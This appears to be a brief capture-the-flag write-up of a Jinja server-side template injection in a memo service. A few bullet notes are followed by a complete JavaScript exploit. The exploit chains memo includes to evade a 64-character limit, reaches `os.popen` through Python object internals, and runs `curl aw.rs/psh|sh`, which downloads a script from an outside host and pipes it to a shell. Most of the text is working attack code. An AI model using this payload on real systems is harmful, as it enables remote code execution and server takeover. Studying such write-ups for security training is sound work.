- The memo body allows for control statements (eg `{% %}`) to be injected https://jinja.palletsprojects.com/en/3.1.x/templates/#list-of-control-structures
- The memo body only allows 64 characters, but they can be combined by creating a variable then using `include` to extend it
- An RCE payload can then be built up similar to https://secure-cookie.io/attacks/ssti/

```javascript
async function memo(userid, password, memo) {
  const resp = await fetch("/memo/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ userid, password, memo }),
  });
  return await resp.json();
}

async function ggg(payload, inc = true) {
  await memo(
    `vak${(i++).toString().padStart(2, "0")}`,
    "super_secret",
    `{%endraw%}{%${payload}%}{%include"vak${i
      .toString()
      .padStart(2, "0")}.html"%}{%raw%}`
  );
}

var i = 1;
var idx = 100; // remote
// var idx = 81; // local

await memo(
  "vakzz",
  "super_secret1",
  `{%endraw%}{%include"vak01.html"%}{%raw%}`
);
await ggg(`set a="".__class__`);
await ggg(`set a=a.__base__`);
await ggg(`set b='__subcl'`);
await ggg(`set b=b+'asses__'`);
await ggg(`set a=a[b]()[${idx}]`);
await ggg(`set a=a.__init__`);
await ggg(`set a=a.__globals__`);
await ggg(`set a=a['sys']`);
await ggg(`set a=a.modules`);
await ggg(`set a=a['os']`);
await ggg(`set a=a.popen`);
await ggg(`set c='curl aw'`);
await ggg(`set c=c+'.rs/psh|sh'`);
await ggg(`set a=a(c)`);
await ggg(`set a=a.read()`);
await memo(
  `vak${(i++).toString().padStart(2, "0")}`,
  "super_secret",
  `{%endraw%}done{%raw%}`
);
await (await fetch("/memo/vakzz/super_secret1")).text();
```
